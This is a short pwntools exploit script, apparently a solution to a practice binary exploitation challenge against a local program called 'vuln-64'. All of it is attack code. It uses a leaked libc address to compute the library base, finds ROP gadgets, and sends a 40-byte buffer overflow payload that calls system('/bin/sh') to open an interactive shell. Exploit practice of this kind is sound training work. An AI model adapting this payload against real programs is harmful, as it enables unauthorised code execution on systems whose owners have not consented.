from pwn import *
elf = context.binary = ELF("./vuln-64")
p = process()
offset = 40
libc = elf.libc
p.recvuntil(b"System is at: ")
__libc__system__leak = int(p.recvline().strip().decode(),16)
__libc__system__offset = libc.sym['__libc_system']
libc.address = __libc__system__leak - __libc__system__offset
system = p64(libc.sym['system'])
bin_sh = p64(next(libc.search(b"/bin/sh")))
rop = ROP(context.binary)
ret = p64(rop.find_gadget(['ret'])[0])
rdi = p64(rop.find_gadget(['pop rdi','ret'])[0])
payload = b"A" * offset + rdi + bin_sh + ret + system + p64(0x0)
p.sendline(payload)
p.interactive()
